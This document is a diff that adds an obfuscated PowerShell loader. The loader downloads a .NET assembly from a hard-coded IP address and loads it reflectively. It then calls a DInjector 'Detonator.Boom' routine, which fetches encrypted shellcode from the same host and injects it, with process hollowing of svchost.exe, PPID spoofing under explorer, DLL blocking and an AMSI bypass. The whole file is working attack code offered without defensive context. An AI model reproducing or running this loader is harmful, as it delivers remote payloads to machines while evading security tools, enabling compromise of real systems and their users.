@@ -1,0 +1,35 @@
+sV  "YuE51" ([typE]"SySTeM.REFLEcTIOn.aSSemblY");  ${a} = "currentthread"
+${B} = "147.182.172.189"
+${C} = 80
+${D} = "user32.dll"
+${E} = "9tVI0"
+${f} = "z64&Rx27Z$B%73up"
+${g} = "C:\Windows\System32\svchost.exe"
+${h} = "notepad"
+${I} = "explorer"
+${j} = "msvcp_win.dll"
+${k} = "True"
+${l} = "True"
+
+${MeThODS} = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended")
+if (${mEThOdS}."Contains".Invoke(${A})) {
+    ${h} = (&"Start-Process" -WindowStyle "Hidden" -PassThru ${H})."Id"
+}
+
+${METhODS} = @("remotethreadapc", "remotethreadcontext", "processhollow")
+if (${mEthODS}."Contains".Invoke(${a})) {
+    try {
+        ${I} = (&"Get-Process" ${I} -ErrorAction "Stop")."ID"
+    }
+    catch {
+        ${I} = 0
+    }
+}
+
+${cmd} = "currentthread /sc:http://147.182.172.189:80/9tVI0 /password:z64&Rx27Z$B%73up /image:C:\Windows\System32\svchost.exe /pid:notepad /ppid:explorer /dll:msvcp_win.dll /blockDlls:True /am51:True"
+${data} = (."IWR" -UseBasicParsing "http://147.182.172.189:80/user32.dll")."Content"
+${assem} =  ( ls "variable:yUE51"  )."VaLUe"::"Load".Invoke(${data})
+${flags} = [Reflection.BindingFlags] "Static, NonPublic"
+${class} = ${assem}."GetType".Invoke("DInjector.Detonator", ${flags})
+${entry} = ${class}."GetMethod".Invoke("Boom", ${flags})
+${entry}."Invoke"(${null}, (, ${cmd}."Split".Invoke(" ")))
